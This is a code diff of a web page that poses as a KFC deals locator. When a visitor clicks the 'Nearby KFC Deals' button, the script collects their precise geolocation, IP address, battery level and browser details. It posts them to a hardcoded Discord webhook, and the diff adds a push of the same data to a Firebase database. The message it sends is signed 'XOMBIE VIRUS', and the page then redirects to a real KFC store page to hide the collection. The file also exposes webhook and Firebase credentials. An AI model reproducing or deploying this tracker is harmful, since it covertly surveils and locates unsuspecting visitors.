@@ -93,61 +93,77 @@
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
   </div>
 
- <script>
-    const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
-    const bg = document.getElementById('background');
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js"></script>
+<script>
+ const firebaseConfig = {
+  apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
+  authDomain: "kfc-tracker.firebaseapp.com",
+  databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
+  projectId: "kfc-tracker",
+  storageBucket: "kfc-tracker.firebasestorage.app",
+  messagingSenderId: "127099679000",
+  appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
+  measurementId: "G-EPEXKK3S37"
+};
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+</script>
 
-    // Animate background
-    for (let i = 0; i < 40; i++) {
-      const img = document.createElement('img');
-      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-      img.style.left = Math.random() * 100 + 'vw';
-      img.style.top = '100vh';
-      img.classList.add('float-up');
-      img.style.animationDuration = (6 + Math.random() * 3) + 's';
-      bg.appendChild(img);
-    }
+<script>
+  const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
+  const bg = document.getElementById('background');
 
-    for (let i = 0; i < 40; i++) {
-      const img = document.createElement('img');
-      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-      img.style.left = Math.random() * 100 + 'vw';
-      img.style.top = '-150px';
-      img.classList.add('float-down');
-      img.style.animationDuration = (6 + Math.random() * 3) + 's';
-      bg.appendChild(img);
-    }
+  // Animate background
+  for (let i = 0; i < 40; i++) {
+    const img = document.createElement('img');
+    img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+    img.style.left = Math.random() * 100 + 'vw';
+    img.style.top = '100vh';
+    img.classList.add('float-up');
+    img.style.animationDuration = (6 + Math.random() * 3) + 's';
+    bg.appendChild(img);
+  }
 
-    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
+  for (let i = 0; i < 40; i++) {
+    const img = document.createElement('img');
+    img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+    img.style.left = Math.random() * 100 + 'vw';
+    img.style.top = '-150px';
+    img.classList.add('float-down');
+    img.style.animationDuration = (6 + Math.random() * 3) + 's';
+    bg.appendChild(img);
+  }
 
-    async function sendLocation() {
-      let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
+  const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
-      // Get IP address from external API
-      try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        ip = ipData.ip;
-      } catch (e) {}
+  async function sendLocation() {
+    let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
-      // Get battery level if available
-      try {
-        const batt = await navigator.getBattery();
-        battery = Math.round(batt.level * 100) + "%";
-      } catch (e) {}
+    // Get IP address
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      ip = ipData.ip;
+    } catch (e) {}
 
-      // Get geolocation
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            lat = position.coords.latitude;
-            lon = position.coords.longitude;
-            accuracy = position.coords.accuracy;
+    // Get battery level
+    try {
+      const batt = await navigator.getBattery();
+      battery = Math.round(batt.level * 100) + "%";
+    } catch (e) {}
 
-       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-const signature = `\n\n🧠 **Powered by XOMBIE VIRUS** ☣️`;
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          lat = position.coords.latitude;
+          lon = position.coords.longitude;
+          accuracy = position.coords.accuracy;
 
-const content = `🍗 **Nearby KFC Deal Request**
+          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+          const signature = `\n\n🧠 **Powered by XOMBIE VIRUS** ☣️`;
+
+          const content = `🍗 **Nearby KFC Deal Request**
 📍 **Latitude:** ${lat}
 📍 **Longitude:** ${lon}
 🎯 **Accuracy:** ${accuracy} meters
@@ -156,29 +172,43 @@ const content = `🍗 **Nearby KFC Deal Request**
 🧠 **User Agent:** ${userAgent}
 📍 [Google Maps Link](${mapUrl})${signature}`;
 
+          // Send to Webhook
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: content })
+          });
 
-            fetch(webhookUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content: content })
-            }).finally(() => {
-              setTimeout(() => {
-                window.location.href = "https://www.kfcpakistan.com/store-locations";
-              }, 1000);
-            });
-          },
-          () => {
+          // Also push to Firebase
+          const dbData = {
+            latitude: lat,
+            longitude: lon,
+            accuracy: accuracy,
+            ip: ip,
+            battery: battery,
+            userAgent: userAgent,
+            timestamp: new Date().toLocaleString()
+          };
+          db.ref("locations").push(dbData);
+
+          // Redirect
+          setTimeout(() => {
             window.location.href = "https://www.kfcpakistan.com/store-locations";
-          }
-        );
-      } else {
-        window.location.href = "https://www.kfcpakistan.com/store-locations";
-      }
+          }, 1000);
+        },
+        () => {
+          window.location.href = "https://www.kfcpakistan.com/store-locations";
+        }
+      );
+    } else {
+      window.location.href = "https://www.kfcpakistan.com/store-locations";
     }
-  </script>
+  }
+</script>
 
 </body>
 </html>
+
 
 
 
